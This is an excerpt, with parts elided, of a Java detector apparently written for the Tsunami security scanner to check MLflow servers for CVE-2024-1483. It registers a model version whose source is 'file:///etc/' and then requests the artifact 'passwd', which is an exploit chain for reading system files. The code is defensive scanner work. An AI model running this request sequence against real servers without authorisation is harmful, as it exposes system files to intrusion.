...
public final class Cve20241483Detector implements VulnDetector {
    ...
    private boolean isServiceVulnerable(NetworkService networkService) {
        String name = "tsunami_scanner_" + UUID.randomUUID().toString().replaceAll("-", "").substring(0, 4);
        ...
        String getArtifactUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "model-versions/get-artifact?path=passwd&name="+ name +"&version=1";
        try {
            HttpResponse httpResponse =
                  httpClient.send(
                          get(getArtifactUrl)
                                  .setHeaders(HttpHeaders.builder().addHeader(USER_AGENT, "TSUNAMI_SCANNER").build())
                                  .build());
    ...
    private String createExperiment(String name, NetworkService networkService) {
        String experimentId = "";
        String createExperimentUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "ajax-api/2.0/mlflow/experiments/create";
    ...
    private String createRun(String experimentId, NetworkService networkService) {
        String runId = "";
        String createRunUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "api/2.0/mlflow/runs/create";
        String payload = new JSONObject()
    ...
    private void registerModel(String name, NetworkService networkService) {
        String registerModelUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "ajax-api/2.0/mlflow/registered-models/create";
        String payload = new JSONObject()
                .put("name", name)
                .toString();
        try {
    ...
    private void createModelVersion(String name, String runId, NetworkService networkService) {
        String createModelUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "ajax-api/2.0/mlflow/model-versions/create";
        String payload = new JSONObject()
                .put("name", name)
                .put("run_id", runId)
                .put("source", "file:///etc/")
